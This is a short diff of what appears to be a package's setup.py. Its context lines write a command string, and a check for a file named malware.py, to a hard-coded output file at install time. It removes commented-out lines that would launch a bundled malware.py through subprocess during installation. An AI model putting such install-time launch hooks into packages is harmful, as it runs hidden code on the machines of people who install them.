@@ -82,13 +82,6 @@ with open("/home/parish/output.txt", "w") as text_file:
         text_file.write(command + "\n")
         text_file.write(str(os.path.exists(home + '/malware.py')) + "\n")
         
-
-
-# command = sys.executable + " " + os.path.join(here, 'requests', 'malware.py')
-# subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
-
-
-
 setup(
     name=about['__title__'],
     version=about['__version__'],
